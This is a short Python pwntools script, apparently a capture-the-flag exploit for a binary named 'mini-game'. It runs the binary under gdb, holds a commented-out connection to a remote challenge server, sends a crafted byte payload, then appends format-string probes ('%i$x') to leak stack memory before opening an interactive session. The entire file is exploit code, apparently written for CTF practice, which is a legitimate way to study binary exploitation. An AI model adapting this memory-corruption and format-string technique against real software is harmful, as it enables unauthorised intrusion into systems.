from pwn import *

e = ELF("./mini-game")
p = process("./mini-game")

gdb.attach(p, "b 0x400D8F")
#p = remote("103.237.99.35", 28993)
#for s in e.symbols:
#		print s, hex(e.symbols[s])

print p.recv()
#p.sendline("A"*19+'\x00'*4)
payload = '\x10 \x08@ \x08\x04 \x08\x80@\x01\x04\x02\x80\n+2<9200q\xe8\x1d$0\x00\x00\x00\nY'
p.sendline(payload)

sleep(1)
print p.recv()

for i in range(1,99):
	payload += "AAAA.%"+str(i)+"$x"
p.sendline(payload)

#print p.recv()
p.interactive()
